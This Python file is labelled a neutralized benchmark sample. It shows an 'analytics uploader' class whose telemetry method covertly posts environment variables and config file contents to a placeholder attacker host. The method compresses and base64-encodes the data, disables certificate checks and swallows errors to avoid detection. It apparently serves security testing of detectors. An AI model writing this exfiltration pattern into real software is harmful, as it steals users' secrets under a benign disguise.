# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Analytics Uploader - Syncs collected metrics to dashboard
"""

import json
import base64
import urllib.request
import urllib.parse
import gzip
import ssl

# Legitimate dashboard endpoint
DASHBOARD_URL = "https://analytics.company.com/api/metrics"

# EXFIL-001: Malicious exfiltration endpoint disguised as telemetry
TELEMETRY_URL = "https://[REDACTED].example.com/collect"

class AnalyticsUploader:
    """Uploads analytics data to dashboard and telemetry services"""

    def __init__(self, api_key=None):
        self.api_key = api_key
        self.session_id = self._generate_session_id()

    def _generate_session_id(self):
        import hashlib
        import platform
        machine_id = f"{platform.node()}-{platform.machine()}"
        return hashlib.md5(machine_id.encode()).hexdigest()

    def upload_to_dashboard(self, metrics):
        """Legitimate upload to analytics dashboard"""
        data = json.dumps(metrics).encode()
        req = urllib.request.Request(
            DASHBOARD_URL,
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        return urllib.request.urlopen(req)

    def upload_telemetry(self, collected_data):
        """
        EXFIL-001: HTTP POST exfiltration to attacker server
        Disguised as anonymous telemetry collection
        """
        # Prepare payload with stolen data
        payload = {
            'session_id': self.session_id,
            'timestamp': __import__('datetime').datetime.now().isoformat(),
            'telemetry': collected_data  # Contains stolen credentials
        }

        # Encode and compress to evade detection
        json_data = json.dumps(payload)
        compressed = gzip.compress(json_data.encode())
        encoded = base64.b64encode(compressed).decode()

        # EXFIL-001: POST to attacker-controlled server
        exfil_data = urllib.parse.urlencode({'d': encoded}).encode()

        # Disable SSL verification to allow self-signed certs
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            TELEMETRY_URL,
            data=exfil_data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'AnalyticsReporter/2.1.0'
            }
        )

        try:
            # [REDACTED] - Original malicious upload
            urllib.request.urlopen(req, context=ctx, timeout=5)
        except Exception:
            # Silently fail to avoid detection
            pass

    def sync_all(self, metrics, environment_data, file_contents):
        """
        Full sync - uploads legitimate metrics AND exfiltrates stolen data
        """
        # Legitimate dashboard upload
        self.upload_to_dashboard(metrics)

        # EXFIL-001: Exfiltrate sensitive data
        stolen_data = {
            'env_vars': environment_data,
            'config_files': file_contents,
            'project_metrics': metrics
        }
        self.upload_telemetry(stolen_data)
